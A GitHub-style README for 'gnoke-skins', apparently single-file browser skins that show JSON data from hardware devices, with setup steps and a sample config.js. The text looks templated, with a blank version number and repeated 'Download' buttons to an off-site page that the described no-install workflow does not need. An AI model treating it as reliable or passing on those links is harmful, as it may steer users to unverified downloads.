# gnoke-skins v - UI skins 2026

> **Browser-based UI skins for hardware devices, centered on a simple JSON endpoint and a lightweight config file, with no framework, no install, and no firmware changes required.**

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lewismatt1989/gnoke-skins-ui-2026?style=flat-square)](https://github.com/lewismatt1989/gnoke-skins-ui-2026)

---

<p align="center">
  <a href="https://lewismatt1989.github.io/gnoke-skins-ui-2026/">
    <img src="https://img.shields.io/badge/Download-gnoke-skins%20Latest-brightgreen?style=for-the-badge" alt="Download gnoke-skins">
  </a>
</p>

> **[Download - gnoke-skins v](https://lewismatt1989.github.io/gnoke-skins-ui-2026/)**

---

[Download Latest Build](https://lewismatt1989.github.io/gnoke-skins-ui-2026/)

---

## What is gnoke-skins?

gnoke-skins is a set of browser UI skins for hardware devices that publish data through a JSON endpoint. Each skin ships as one HTML file, which keeps hosting lightweight, makes replacement easy, and allows quick adaptation across different devices.

It is meant for cases where you want a new visual presentation without touching the device firmware itself. With a single `config.js` file plus a matching `index.html`, you can bind device data to the interface and display it in a clean web view.

---

## Key capabilities

- Single-file HTML skins for straightforward deployment
- Config-based JSON key mapping via `config.js`
- Works with devices that expose a JSON endpoint
- No framework dependency
- No installation step needed
- No firmware modifications on the device
- Simple skin replacement without altering device logic
- Browser-driven UI layer for hardware dashboards and display panels

---

## Installation

1. Download or clone the repository.
2. Open the skin folder you want to use.
3. Edit `config.js` to point to your device's JSON endpoint and map the fields you need.
4. Open `index.html` in a web browser or host it from your preferred static location.

Typical clone command:

`git clone https://github.com/lewismatt1989/gnoke-skins-ui-2026.git

If you are testing locally, load `index.html` after updating the config file.

---

## Usage

A typical flow is:

1. Pick a skin folder.
2. Update `config.js` with your device endpoint and field names.
3. Open `index.html`.
4. Refresh the page when the device data changes.

Example setup pattern:

- Device exposes JSON at a reachable URL
- `config.js` maps JSON keys to visible UI values
- `index.html` renders the skin in the browser

If you want to change the look or data layout, duplicate a skin folder, edit the HTML, and adjust the config mapping to match your device response.

---

## Configuration

Most of the setup is handled in `config.js`. That file is where you define the endpoint and the JSON field mapping used by the skin.

Example structure:

```js
const config = {
  endpoint: "https://device.local/status.json",
  map: {
    title: "name",
    value: "reading"
  }
};
```

The main interface is in `index.html`, so visual updates can usually be made there without adding any framework or build step.

---

## Requirements

- A web browser
- A hardware device or service that exposes JSON
- Access to the device endpoint
- Basic static file hosting if you want to publish the skin online

No additional runtime, package manager, or firmware update is required for the core workflow.

---

## FAQ

**Do I need a framework for this?**  
No. The skins are built with plain HTML plus a configuration file.

**Can it work with different hardware?**  
Yes. Any device that serves JSON can be used as long as the mapping matches the response.

**Where do I change the data source?**  
Update `config.js` with the endpoint and key mapping for your device.

**Can I change the design without modifying the device?**  
Yes. The skin can be swapped or edited independently of the hardware firmware.

**What should I check if nothing is showing up?**  
Confirm the endpoint URL, verify the JSON field names, and make sure the browser can reach the device.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
